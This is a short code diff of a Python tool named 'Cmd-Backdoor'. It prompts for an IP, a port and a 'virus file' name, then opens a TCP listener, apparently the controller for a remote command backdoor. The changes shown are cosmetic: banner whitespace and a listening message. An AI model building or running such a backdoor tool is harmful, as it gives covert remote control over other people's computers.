@@ -3,13 +3,13 @@ import os
 import time
 
 print("""\033[31m
-   _____               _            ____             _       _                  
-  / ____|             | |          |  _ \           | |     | |                 
- | |     _ __ ___   __| |  ______  | |_) | __ _  ___| | ____| | ___   ___  _ __ 
+   _____               _            ____             _       _
+  / ____|             | |          |  _ \           | |     | |
+ | |     _ __ ___   __| |  ______  | |_) | __ _  ___| | ____| | ___   ___  _ __
  | |    | '_ ` _ \ / _` | |______| |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
- | |____| | | | | | (_| |          | |_) | (_| | (__|   < (_| | (_) | (_) | |   
-  \_____|_| |_| |_|\__,_|          |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
-""")  
+ | |____| | | | | | (_| |          | |_) | (_| | (__|   < (_| | (_) | (_) | |
+  \_____|_| |_| |_|\__,_|          |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|
+""")
 HOST = input("\033[91m[\033[37m~\033[91m]\033[37m On What Ip Should Cmd-Backdoor Start? (Example : localhost) : ")
 PORT = input("\033[91m[\033[37m~\033[91m]\033[37m On What Port Should Cmd-Backdoor Start? (Example : 443) : ")
 NAME = input("\033[91m[\033[37m~\033[91m]\033[37m What Is The Name Of The Virus File? (Example : test.pyw) : ")
@@ -41,7 +41,7 @@ s = socket(AF_INET, SOCK_STREAM)
 s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
 s.bind((HOST, int(PORT)))
 print("")
-print("\033[91m[\033[37m~\033[91m]\033[37m Listening On 127.0.0.1:%s" % str(PORT))
+print("\033[91m[\033[37m~\033[91m]\033[37m Listening On {}:{}".format(HOST,str(PORT)))
 
 s.listen(1)
 
